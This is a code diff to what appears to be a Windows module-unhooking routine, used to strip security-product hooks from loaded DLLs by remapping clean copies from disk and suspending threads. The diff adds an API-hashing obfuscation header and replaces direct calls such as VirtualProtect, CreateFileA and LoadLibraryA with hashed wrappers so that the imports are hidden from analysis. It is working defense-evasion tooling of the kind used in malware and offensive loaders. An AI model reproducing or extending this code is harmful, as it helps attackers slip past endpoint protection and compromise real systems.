@@ -7,6 +7,7 @@
 #include <Psapi.h>
 #include <Shlwapi.h>
 #include <winternl.h>
+#include "api_obfuscation.hpp"
 
 #pragma comment(lib, "Shlwapi.lib")
 
@@ -254,7 +255,7 @@ BOOLEAN SuspendResumeCallback(PWRK_SYSTEM_PROCESS_INFORMATION Process, PVOID Arg
           NtResumeThread(hThread, &SuspendCount);
           break;
       }
-      NtClose(hThread);
+      hash_NtClose(hThread);
     }
   }
   return FALSE; // Stop the processes enumeration loop
@@ -281,7 +282,7 @@ BOOLEAN ResumeThreads()
 DWORD GetModuleName(const HMODULE hModule, LPSTR szModuleName, const DWORD nSize)
 {
   DWORD dwLength = GetModuleFileNameExA(
-                     GetCurrentProcess(),	// Process handle.
+                     hash_GetCurrentProcess(),	// Process handle.
                      hModule,				// Module handle.
                      szModuleName,			// Pointer to buffer to receive file name.
                      nSize					// Size of the buffer in characters.
@@ -299,7 +300,7 @@ DWORD GetModuleName(const HMODULE hModule, LPSTR szModuleName, const DWORD nSize
 DWORD ProtectMemory(const LPVOID lpAddress, const SIZE_T nSize, const DWORD flNewProtect)
 {
   DWORD flOldProtect = 0;
-  BOOL bRet = VirtualProtect(
+  BOOL bRet = hash_VirtualProtect(
                 lpAddress,		// Base address to protect.
                 nSize,			// Size to protect.
                 flNewProtect,	// Desired protection.
@@ -370,7 +371,7 @@ DWORD UnhookModule(const HMODULE hModule)
     return dwRet;
   }
   // Get a handle to the module's file.
-  HANDLE hFile = CreateFileA(
+  HANDLE hFile = hash_CreateFileA(
                    szModuleName,		// Module path name.
                    GENERIC_READ,		// Desired access.
                    FILE_SHARE_READ,	// Share access.
@@ -395,13 +396,13 @@ DWORD UnhookModule(const HMODULE hModule)
   if (!hFileMapping) {
     // Failed to create mapping handle.
     // Clean up.
-    CloseHandle(hFile);
+    hash_CloseHandle(hFile);
     return ERR_CREATE_FILE_MAPPING_FAILED;
   }
-  else if (GetLastError() == ERROR_ALREADY_EXISTS) {
+  else if (hash_GetLastError() == ERROR_ALREADY_EXISTS) {
     // Error creating mapping handle.
     // Clean up.
-    CloseHandle(hFile);
+    hash_CloseHandle(hFile);
     return ERR_CREATE_FILE_MAPPING_ALREADY_EXISTS;
   }
   // Map the module.
@@ -415,8 +416,8 @@ DWORD UnhookModule(const HMODULE hModule)
   if (!lpMapping) {
     // Mapping failed.
     // Clean up.
-    CloseHandle(hFileMapping);
-    CloseHandle(hFile);
+    hash_CloseHandle(hFileMapping);
+    hash_CloseHandle(hFile);
     return ERR_MAP_FILE_FAILED;
   }
   // printf("Mapping at [%016p]\n", lpMapping);
@@ -429,22 +430,22 @@ DWORD UnhookModule(const HMODULE hModule)
     // Something went wrong!
     // Clean up.
     UnmapViewOfFile(lpMapping);
-    CloseHandle(hFileMapping);
-    CloseHandle(hFile);
+    hash_CloseHandle(hFileMapping);
+    hash_CloseHandle(hFile);
     return dwRet;
   }
   //getchar();
   // Clean up.
   UnmapViewOfFile(lpMapping);
-  CloseHandle(hFileMapping);
-  CloseHandle(hFile);
+  hash_CloseHandle(hFileMapping);
+  hash_CloseHandle(hFile);
   return ERR_SUCCESS;
 }
 
 HMODULE AddModule(const char *lpLibName) {
-  HMODULE hModule = GetModuleHandleA(lpLibName);
+  HMODULE hModule = hash_GetModuleHandleA(lpLibName);
   if (!hModule) {
-    hModule = LoadLibraryA(lpLibName);
+    hModule = hash_LoadLibraryAA(lpLibName);
   }
   return hModule;
 }
@@ -454,7 +455,7 @@ DWORD Unhook(const char *lpLibName) {
   DWORD hMod = UnhookModule(hModule);
   // free lib
   if (hMod) {
-    FreeModule(hModule);
+    hash_FreeLibrary(hModule);
   }
   return hMod;
 }
